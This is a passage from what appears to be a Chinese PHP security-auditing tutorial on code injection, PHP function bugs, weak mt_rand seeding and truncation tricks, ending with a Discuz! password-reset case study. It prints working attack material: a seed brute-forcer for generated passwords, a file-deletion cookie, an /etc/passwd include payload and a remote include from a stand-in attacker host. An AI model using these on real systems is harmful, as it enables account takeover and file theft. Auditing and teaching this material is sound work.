if (!get_magic_quotes_gpc())<br>
{<br>
$_GET&nbsp; = addslashes_array($_GET);<br>
}</p>
<p>function addslashes_array($value)<br>
{<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return is_array($value) ? array_map('addslashes_array', $value) :
 addslashes($value);<br>
}<br>
print_R($_GET);<br>
foreach ($_GET AS $key =&gt; $value)<br>
{<br>
print $key;<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体<br>
的值，但是没有处理变量本身的key，上面的代码显示结果如下：<br>
&nbsp; <br>
Array<br>
(<br>
&nbsp;&nbsp;&nbsp; [aaa'aa] =&gt; 1\'<br>
)<br>
aaa'aa</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无 <br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.4 代码注射</p>
<p>5.4.1 PHP中可能导致代码注射的函数</p>
<p>&nbsp;&nbsp;&nbsp; 很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可<br>
以执行代码如：</p>
<p>assert()<br>
call_user_func()<br>
call_user_func_array()<br>
create_function()<br>
变量函数<br>
...</p>
<p>&nbsp;&nbsp;&nbsp; 这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//how to exp this code<br>
$sort_by=$_GET['sort_by'];<br>
$sorter='strnatcasecmp';<br>
$databases=array('test','test');<br>
$sort_function = '&nbsp; return 1 * ' . $sorter . '($a["' . $sort_by . '"], 
$b["' . $sort_by . '"]);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ';<br>
usort($databases, create_function('$a, $b', $sort_function));<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）<br>
+++++++++++++++++++++++++</p>
<p><br>
5.4.2 变量函数与双引号<br>
&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p>
<p>--code-------------------------------------------------------------------------<br>
echo "$a\n";<br>
echo '$a\n';<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 我们再看如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
//how to exp this code<br>
if($globals['bbc_email']){</p>
<p>$text = preg_replace(<br>
array("/\[email=(.*?)\](.*?)\[\/email\]/ies",<br>
"/\[email\](.*?)\[\/email\]/ies"),<br>
array('check_email("$1", "$2")',<br>
'check_email("$1", "$1")'), $text);<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很<br>
容易被人注射变量函数。<br>
&nbsp;&nbsp; <br>
+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.5 PHP自身函数漏洞及缺陷<br>
&nbsp;&nbsp;&nbsp;&nbsp; <br>
5.5.1 PHP函数的溢出漏洞</p>
<p>&nbsp;&nbsp;&nbsp; 大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录[2]）项目么，其中比较<br>
有名的要算是unserialize()，代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']);<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的<br>
时候不要忘记了测试目标使用的PHP版本信息。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：对应fix的版本<br>
系统要求：<br>
审计策略：查找对应函数名<br>
+++++++++++++++++++++++++</p>
<p><br>
5.5.2 PHP函数的其他漏洞</p>
<p>&nbsp;&nbsp;&nbsp; Stefan Esser大牛发现的漏洞：unset()--Zend_Hash_Del_Key_Or_Index 
Vulnerability<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 比如phpwind早期的serarch.php里的代码：</p>
<p>--code-------------------------------------------------------------------------<br>
unset($uids);<br>
......<br>
$query=$db-&gt;query("SELECT uid FROM pw_members WHERE username LIKE 
'$pwuser'");<br>
while($member=$db-&gt;fetch_array($query)){<br>
$uids .= $member['uid'].',';<br>
}<br>
$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';<br>
........<br>
$query = $db-&gt;query("SELECT DISTINCT t.tid FROM $sqltable WHERE 
$sqlwhere $orderby $limit");<br>
-------------------------------------------------------------------------------<br>
&nbsp;&nbsp;&nbsp; <br>
+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：php4&lt;4.3 php5&lt;5.14<br>
系统要求：无<br>
审计策略：查找unset<br>
+++++++++++++++++++++++++</p>
<p><br>
5.5.3 session_destroy()删除文件漏洞（测试PHP版本：5.1.2）<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，<br>
很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老<br>
的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php <br>
//val.php&nbsp;&nbsp; <br>
session_save_path('./');<br>
session_start();<br>
if($_GET['del']) {<br>
session_unset();<br>
session_destroy();<br>
}else{<br>
$_SESSION['hei']=1;<br>
echo(session_id());<br>
print_r($_SESSION);<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess_/../1.php')这样<br>
就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，<br>
sablog，phpwind3等等。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：具体不详<br>
系统要求：无<br>
审计策略：查找session_destroy<br>
+++++++++++++++++++++++++</p>
<p><br>
5.5.4 随机函数<br>
&nbsp;&nbsp;&nbsp; <br>
1) rand() VS mt_rand()</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//on windows<br>
print mt_getrandmax(); //2147483647<br>
print getrandmax();// 32767<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 </p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
$a= md5(rand());<br>
for($i=0;$i&lt;=32767;$i++){<br>
&nbsp; if(md5($i) ==$a ) {<br>
&nbsp;&nbsp; print $i."--&gt;ok!!&lt;br&gt;";exit;<br>
&nbsp;&nbsp; }else { print $i."&lt;br&gt;";}<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于<br>
mt_rand是很难单纯的暴力的。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找rand<br>
+++++++++++++++++++++++++</p>
<p><br>
2) mt_srand()/srand()-weak seeding（by Stefan Esser）<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 看php手册里的描述：</p>
<p>-------------------------------------------------------------------------------<br>
mt_srand<br>
(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)</p>
<p>mt_srand -- 播下一个更好的随机数发生器种子<br>
说明<br>
void mt_srand ( int seed )</p>
<p><br>
用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空<br>
时，会被设为随时数。 </p>
<p>例子 1. mt_srand() 范例</p>
<p>&lt;?php<br>
// seed with microseconds<br>
function make_seed()<br>
{<br>
&nbsp;&nbsp;&nbsp; list($usec, $sec) = explode(' ', microtime());<br>
&nbsp;&nbsp;&nbsp; return (float) $sec + ((float) $usec * 100000);<br>
}<br>
mt_srand(make_seed());<br>
$randval = mt_rand();<br>
?&gt;&nbsp; </p>
<p>注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已<br>
自动完成。<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p>
<p>--code-------------------------------------------------------------------------<br>
mt_srand ((double) microtime() * 1000000)<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 但是使用(double)microtime()*1000000类似的代码seed是比较脆弱的：</p>
<p>0&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 
1000000&lt;1000000</p>
<p>&nbsp;&nbsp;&nbsp; 那么很容易暴力破解,测试代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
/////////////////<br>
//&gt;php rand.php<br>
//828682<br>
//828682<br>
////////////////<br>
ini_set("max_execution_time",0);<br>
$time=(double) microtime()* 1000000;<br>
print $time."\n";<br>
mt_srand ($time);</p>
<p>$search_id = mt_rand();<br>
$seed = search_seed($search_id);<br>
print $seed;<br>
function search_seed($rand_num) {<br>
$max = 1000000;<br>
for($seed=0;$seed&lt;=$max;$seed++){<br>
mt_srand($seed);<br>
$key = mt_rand();<br>
if($key==$rand_num) return $seed;<br>
}<br>
return false;<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化<br>
而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是<br>
特定的。如下图：</p>
<p>+--------------+<br>
|&nbsp;&nbsp; seed-A&nbsp;&nbsp;&nbsp;&nbsp; |<br>
+--------------+<br>
| mt_rand-A-1&nbsp; |<br>
| mt_rand-A-2&nbsp; |<br>
| mt_rand-A-3&nbsp; |<br>
+--------------+</p>
<p>+--------------+<br>
|&nbsp;&nbsp; seed-B&nbsp;&nbsp;&nbsp;&nbsp; |<br>
+--------------+<br>
| mt_rand-B-1&nbsp; |<br>
| mt_rand-B-2&nbsp; |<br>
| mt_rand-B-3&nbsp; |<br>
+--------------+</p>
<p>&nbsp;&nbsp;&nbsp; 对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于<br>
seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次<br>
mt_rand的值了。</p>
<p>&nbsp;&nbsp;&nbsp; 对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以<br>
为这样就是安全的），这个要分两种情况来分析：</p>
<p>第一种：'Cross Application Attacks'，这个思路在Stefan Esser文章里有提到，主要是利用<br>
其他程序定义的播种（如mt_srand ((double) microtime()* 1000000)），phpbb+wordpree组<br>
合就存在这样的危险.</p>
<p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：</p>
<p>-------------------------------------------------------------------------------<br>
The Implementation<br>
When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and
 PHP 5 <br>
&lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the 
seed is only<br>
31 and not 32 bits. In PHP 5.2.1 and above the implementation of the 
Mersenne <br>
Twister was changed and the forced bit removed.<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 在32位系统上默认的播种的种子为最大值是2^32，这样我们循环最多2^32次就可以破解<br>
seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录<br>
[3]）,测试代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
mt_srand(4); <br>
$a = mt_rand(); <br>
mt_srand(5); <br>
$b = mt_rand();<br>
print $a."\n".$b;<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//base on http://www.milw0rm.com/exploits/6421 <br>
//test on php 5.2.0</p>
<p>define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1</p>
<p>$key = wp_generate_password(20, false);<br>
echo $key."\n";<br>
$seed = getseed($key);<br>
print $seed."\n"; </p>
<p>mt_srand($seed);<br>
$pass = wp_generate_password(20, false);<br>
echo $pass."\n"; </p>
<p>function wp_generate_password($length = 12, $special_chars = true) {<br>
$chars = 
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';<br>
if ( $special_chars )<br>
$chars .= '!@#$%^&amp;*()';</p>
<p>$password = '';<br>
for ( $i = 0; $i &lt; $length; $i++ )<br>
$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);<br>
return $password;<br>
} </p>
<p>function getseed($resetkey) {<br>
$max = pow(2,(32-BUGGY));<br>
for($x=0;$x&lt;=$max;$x++) {<br>
$seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; <br>
mt_srand($seed);<br>
$testkey = wp_generate_password(20,false);<br>
if($testkey==$resetkey) { echo "o\n"; return $seed; }</p>
<p>if(!($x % 10000)) echo $x / 10000;<br>
}<br>
echo "\n";<br>
return false;<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 运行结果如下：</p>
<p>-------------------------------------------------------------------------------<br>
php5&gt;php rand.php<br>
M8pzpjwCrvVt3oobAaOr<br>
0123456789101112131415161718192021222324252627282930313233343536373839404142434<br>
445464748495051525354555657585960616263646566676869<br>
7071727374757677787980818283848586878889909192939495969798991001011021031041051<br>
061071081091101111121131141151161171181191201211221<br>
2312412512612712812913013113213313413513613713813914014114214314414514614714814<br>
915015115215315415515615715815916016116216316416516<br>
6167168169170171172173174175176177178179180181182183184185186187188189190191192<br>
193194195196197198199200201202203204205206207208209<br>
2102112122132142152162172182192202212222232242252262272282292302312322332342352<br>
362372382392402412422432442452462472482492502512522<br>
..............01062110622106231062410625106261062710628106291063010631106321063<br>
3o<br>
70693<br>
pjwCrvVt3oobAaOr<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 当10634次时候我们得到了结果。</p>
<p>&nbsp;&nbsp;&nbsp; 当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致<br>
了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
mt_srand(42);<br>
echo mt_rand();<br>
//php&lt;=5.20 1387371436<br>
//php&gt;5.20 1354439493 <br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也<br>
要是&gt;5.20的版本，反过来也是一样。</p>
<p>&nbsp;&nbsp;&nbsp; 从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安<br>
全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样<br>
的后果就是被攻击者恶意利用直接修改密码。</p>
<p>&nbsp;&nbsp;&nbsp; 很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将<br>
实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：php4 php5&lt;5.2.6<br>
系统要求：无<br>
审计策略：查找mt_srand/mt_rand<br>
+++++++++++++++++++++++++</p>
<p><br>
5.6 特殊字符</p>
<p>&nbsp;&nbsp;&nbsp; 其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用<br>
的一类字符。下面就举几个例子：<br>
&nbsp;&nbsp; <br>
5.6.1 截断</p>
<p>&nbsp;&nbsp;&nbsp; 其中最有名的数大家都熟悉的null字符截断。</p>
<p>5.6.1.1 include截断</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php <br>
include $_GET['action'].".php"; <br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有<br>
其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交<br>
“action=http://www.hacksite.com/evil-code.txt?”这里“?”实现了“伪截断”：），好象这个<br>
看上去不是那么舒服那么我们简单写个代码fuzz一下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
////////////////////<br>
////var5.php代码:<br>
////include $_GET['action'].".php"; <br>
////print strlen(realpath("./"))+strlen($_GET['action']);&nbsp; <br>
///////////////////<br>
ini_set('max_execution_time', 0);<br>
$str='';<br>
for($i=0;$i&lt;50000;$i++)<br>
{<br>
$str=$str."/";</p>
<p>$resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);<br>
//1.txt里的代码为print 'hi';<br>
if (strpos($resp, 'hi') !== false){<br>
print $i;<br>
exit;<br>
}<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和*nix<br>
的系统长度不一样，当win下strlen(realpath("./"))+strlen($_GET['action'])的长度大于<br>
256时被截断，对于*nix的长度是4 * 1024 = 4096。对于php.ini里设置远程文件关闭的时候<br>
就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）</p>
<p><br>
5.6.1.2 数据截断<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应<br>
用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然<br>
而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数<br>
据。<br>
&nbsp;&nbsp;&nbsp; <br>
1) Mysql SQL Column Truncation Vulnerabilities<br>
&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql<br>
的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超<br>
长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截<br>
断问题。测试如下：<br>
&nbsp;&nbsp;&nbsp; <br>
--code-------------------------------------------------------------------------<br>
mysql&gt; insert into truncated_test(`username`,`password`) 
values("admin","pass");</p>
<p>mysql&gt; insert into truncated_test(`username`,`password`) 
values("admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x", "new_pass");<br>
Query OK, 1 row affected, 1 warning (0.01 sec)</p>
<p>mysql&gt; select * from truncated_test;<br>
+----+------------+----------+<br>
| id | username&nbsp;&nbsp; | password |<br>
+----+------------+----------+<br>
| 1 | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | pass&nbsp;&nbsp;&nbsp;&nbsp; |<br>
| 2 | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | new_pass |<br>
+----+------------+----------+<br>
2 rows in set (0.00 sec)<br>
-------------------------------------------------------------------------------</p>
<p>2) Mysql charset Truncation vulnerability<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据<br>
截断。测试如下：<br>
&nbsp;&nbsp;&nbsp; <br>
--code-------------------------------------------------------------------------<br>
mysql&gt; insert into truncated_test(`username`,`password`) 
values(concat("admin",0xc1), "new_pass2");<br>
Query OK, 1 row affected, 1 warning (0.00 sec)</p>
<p>mysql&gt; select * from truncated_test;<br>
+----+------------+----------+<br>
| id | username&nbsp;&nbsp; | password |<br>
+----+------------+----------+<br>
| 1 | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | pass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>
| 2 | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | new_pass&nbsp; |<br>
| 3 | admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | new_pass2 |<br>
+----+------------+----------+<br>
2 rows in set (0.00 sec)<br>
-------------------------------------------------------------------------------<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同<br>
数据，如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
$result = mysql_query("SELECT * from test_user where user='$user' ");<br>
&nbsp; ....<br>
if(@mysql_fetch_array($result, MYSQL_NUM)) {<br>
die("already exist");<br>
}<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.6.1.3 文件操作里的特殊字符<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字<br>
符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个<br>
主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“.\..\”<br>
进行系统转跳等等。<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 下面还给大家介绍一个非常有意思的问题：</p>
<p>--code-------------------------------------------------------------------------<br>
//Is this code vul?<br>
if( eregi(".php",$url) ){<br>
die("ERR");<br>
}<br>
$fileurl=str_replace($webdb[www_url],"",$url);<br>
.....<br>
header('Content-Disposition: attachment; filename='.$filename);<br>
-------------------------------------------------------------------------------<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了<br>
个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过<br>
了。那么上面的代码杂fix呢？有人给出了如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
$fileurl=str_replace($webdb[www_url],"",$url);<br>
if( eregi(".php",$url) ){<br>
die("ERR");<br>
}<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那<br>
么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
for($i=0;$i&lt;255;$i++) {<br>
$url = '1.ph'.chr($i);<br>
$tmp = @file_get_contents($url);<br>
if(!empty($tmp)) echo chr($i)."\r\n";<br>
}&nbsp; <br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 我们在windows系统运行上面的代码得到如下字符* &lt; &gt; ? P p都可以打开目录下的1.php。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：文读取件操作函数<br>
+++++++++++++++++++++++++</p>
<p><br>
六、怎么进一步寻找新的字典</p>
<p>&nbsp;&nbsp;&nbsp; 上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一<br>
步找到新的字典或者利用方式呢？</p>
<p>&nbsp;&nbsp;&nbsp; * 分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典。<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; * 通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式。<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; * fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分<br>
很多都可以简单的fuzz脚本可以测试出来。<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; * 分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审<br>
计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础<br>
上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会<br>
陆续公布一些我们对php源代码的分析）<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; * 有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽<br>
视的问题<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; * 你有什么要补充的吗？ ：）<br>
&nbsp; </p>
<p>七、DEMO</p>
<p>&nbsp;&nbsp;&nbsp; * DEMO -- Discuz! Reset User Password 0day Vulnerability 分析<br>
&nbsp;&nbsp;&nbsp; （Exp:http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt）</p>
<p>&nbsp;&nbsp;&nbsp; PHP版本要求:php4 php5&lt;5.2.6<br>
&nbsp;&nbsp;&nbsp; 系统要求: 无<br>
&nbsp;&nbsp;&nbsp; 审计策略:查找mt_srand/mt_rand</p>
<p>&nbsp;&nbsp;&nbsp; 第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：</p>
<p>-------------------------------------------------------------------------------<br>
heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5<br>
./include/global.func.php-694-&nbsp; $GLOBALS['rewritecompatible'] &amp;&amp;
 $name = rawurlencode($name);<br>
./include/global.func.php-695-&nbsp; return '&lt;a 
href="http://hankjin.blog.163.com/blog/tag-'.$name.'.html"'.stripslashes($extra).'&gt;';<br>
./include/global.func.php-696-}<br>
./include/global.func.php-697-<br>
./include/global.func.php-698-function random($length, $numeric = 0) {<br>
./include/global.func.php:699:&nbsp; PHP_VERSION &lt; '4.2.0' &amp;&amp; 
mt_srand((double)microtime() * 1000000);<br>
./include/global.func.php-700-&nbsp; if($numeric) {<br>
./include/global.func.php-701-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $hash = 
sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));<br>
./include/global.func.php-702-&nbsp; } else {<br>
./include/global.func.php-703-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $hash = '';<br>
./include/global.func.php-704-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $chars = 
'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';<br>
--<br>
./include/discuzcode.func.php-30-<br>
./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || 
!is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {<br>
./include/discuzcode.func.php-32-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @include 
DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';<br>
./include/discuzcode.func.php-33-}<br>
./include/discuzcode.func.php-34-<br>
./include/discuzcode.func.php:35:mt_srand((double)microtime() * 
1000000);<br>
./include/discuzcode.func.php-36-<br>
./include/discuzcode.func.php-37-function attachtag($pid, $aid, 
&amp;$postlist) {<br>
./include/discuzcode.func.php-38-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; global $attachrefcheck, 
$thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;<br>
./include/discuzcode.func.php-39-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $attach = 
$postlist[$pid]['attachments'][$aid];<br>
./include/discuzcode.func.php-40-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if($attach['attachimg']) {<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：</p>
<p>--code-------------------------------------------------------------------------<br>
PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 
1000000);<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 判断了版本，如果是PHP_VERSION &gt; '4.2.0'使用php本身默认的播种。从上一章里的分<br>
析我们可以看得出来，使用php本身默认的播种的分程序两种情况：</p>
<p>1) 'Cross Application Attacks' 这个思路是只要目标上有使用使用的程序里定义了类似<br>
mt_srand((double)microtime() * 1000000)的播种的话，又很有可能被暴力。在dz这里不需<br>
要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： </p>
<p>--code-------------------------------------------------------------------------<br>
./include/discuzcode.func.php:35:mt_srand((double)microtime() * 
1000000);<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用<br>
的流程有兴趣的可以自己分析下]）</p>
